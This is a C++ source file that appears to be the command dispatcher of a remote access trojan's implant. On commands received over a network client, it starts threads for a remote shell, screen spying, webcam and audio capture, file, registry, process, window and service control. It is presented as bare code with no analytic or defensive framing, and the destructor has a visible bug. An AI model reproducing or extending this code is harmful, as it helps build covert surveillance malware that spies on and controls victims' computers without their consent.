// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Common.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(IOCPClient* ClientObject):CManager(ClientObject)
{

	memset(m_hThread,NULL,sizeof(HANDLE)*0x1000);
	m_ulThreadCount = 0;
}

CKernelManager::~CKernelManager()
{

	int i = 0;
	for (i=0;i<0x1000;i++)
	{
		if (m_hThread!=0)
		{
			CloseHandle(m_hThread[i]);
			m_hThread[i] = NULL;
		}
	}
	m_ulThreadCount = 0;
}


VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{

	switch(szBuffer[0])
	{

	case COMMAND_TALK:
		{
			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopTalkManager,
			     NULL, 0, NULL);
			break;
		}
	case COMMAND_SHELL:
		{
			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopShellManager,
			     NULL, 0, NULL);
			break;
		}

	case COMMAND_SYSTEM:       //远程进程管理
		{
			m_hThread[m_ulThreadCount++] = CreateThread(NULL, 0, 
				(LPTHREAD_START_ROUTINE)LoopProcessManager,
				NULL, 0, NULL);
			break;
		}
		
	case COMMAND_WSLIST:       //远程窗口管理
		{
			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopWindowManager,
				NULL, 0, NULL);
			break;
			
		}
	case COMMAND_BYE:
		{
	

            BYTE	bToken = COMMAND_BYE;      //包含头文件 Common.h     
			m_ClientObject->OnServerSending((char*)&bToken, 1); 
	
			break;
		}


	case COMMAND_SCREEN_SPY:
		{

		//	MessageBox(NULL,"11","11",0);


		/*	m_hThread[m_nThreadCount++] = MyCreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopScreenManager,
				(LPVOID)m_pClient->m_Socket, 0, NULL, true);*/

			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopScreenManager,
			     NULL, 0, NULL);

			break;
		}
	case COMMAND_LIST_DRIVE :
		 {
			 
			 m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				 (LPTHREAD_START_ROUTINE)LoopFileManager,
			     NULL, 0, NULL);

			 break;
		 }


	case COMMAND_WEBCAM:
		{
			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopVideoManager,
			     NULL, 0, NULL);
			break;
		}

	case COMMAND_AUDIO:
		{

			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopAudioManager,
			     NULL, 0, NULL);
			break;
		}

	case COMMAND_REGEDIT:
		{
			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopRegisterManager,
			     NULL, 0, NULL);
			break;
		}

	case COMMAND_SERVICES:
		{
			m_hThread[m_ulThreadCount++] = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopServicesManager,
			     NULL, 0, NULL);
			break;
		}
	}
}